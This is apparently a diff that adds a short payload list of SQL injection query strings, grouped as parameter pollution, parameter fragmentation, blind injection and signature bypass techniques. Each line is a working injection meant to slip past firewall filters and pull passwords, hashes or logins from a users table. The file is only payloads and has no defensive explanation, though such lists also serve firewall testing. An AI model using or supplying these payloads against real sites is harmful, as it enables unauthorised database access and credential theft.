@@ -1,0 +1,14 @@
+HPP Technique
+/?id=1;select+1&id=2,3+from+users+where+id=1--
+
+HPF Technique
+/?a=1+union/*&b=*/select+1,2
+/?a=1+unioin/*&b=*/select+1,pass/*&c=*/from+users--
+
+Blind SQL injection
+/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+
+Signature bypass
+/?id=1+union+(select+1,2+from+users)
+/?id=(1)union(select(1),mid(hash,1,32)from(users))
+/?id=1+union+(select'1',concat(login,hash)from+users)
